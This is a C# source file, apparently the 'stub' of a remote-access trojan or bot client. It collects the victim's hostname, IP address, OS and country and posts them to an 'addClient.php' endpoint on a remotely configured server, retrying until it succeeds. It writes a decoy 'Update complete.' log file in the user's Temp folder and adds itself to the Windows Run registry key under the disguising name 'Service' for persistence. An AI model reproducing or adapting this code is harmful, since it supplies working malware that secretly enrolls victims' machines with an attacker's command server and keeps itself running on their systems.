using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using System.Windows;

namespace stub
{
    internal class ClientAdder
    {
        // Method to add a new client by sending system information to a remote server
        public static void addNewClient(WebClient wc, string id, string os, string country)
        {
            // Get the local hostname and IP address
            string name = Dns.GetHostName();
            string ip = IpGrabber.IpReturn();

            // Construct the data to be sent to the server
            string post = "name=" + name + "&ip=" + ip + "&id=" + id + "&os=" + os + "&country=" + country;

            // Fetch drive information and current user
            string letter = DriveGet.getdrives();
            string user = Environment.UserName;

            // Define the file path to store a log
            string connection_path = letter + @"Users\" + user + @"\AppData\Local\Temp\log.txt";
            bool addclient = false;

            // Continuously try to send data to the server until successful
            while (!addclient)
            {
                try
                {
                    if (!File.Exists(connection_path))
                    {
                        // Set the content type and upload data to the server
                        wc.Headers.Add("Content-Type", "application/x-www-form-urlencoded");
                        wc.UploadString("http://" + ConnectionIPHandler.GetIP() + "/addClient.php", post);
                        addclient = true;

                        // Create a log file indicating an update completion
                        using (FileStream fs = File.Create(connection_path))
                        {
                            Byte[] text = new UTF8Encoding(true).GetBytes("Update complete.");
                            fs.Write(text, 0, text.Length);
                        }
                    }
                    else if (File.Exists(connection_path))
                    {
                        // If the log file already exists, set addclient to true and stop the loop
                        addclient = true;
                    }
                }
                catch
                {
                    // If an exception occurs, wait for 3 seconds and continue the loop
                    System.Threading.Thread.Sleep(3000);
                    continue;
                }
            }
        }

        // Method to attempt to add the application to Windows startup
        public static void runAtStartup()
        {
            // Access the Windows registry to add the application to startup programs
            Microsoft.Win32.RegistryKey regKey =
                Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);

            // Set the value in the registry to run the application at startup
            regKey.SetValue("Service", Process.GetCurrentProcess().MainModule.FileName);

            // Close the registry key
            regKey.Dispose();
            regKey.Close();
        }
    }
}
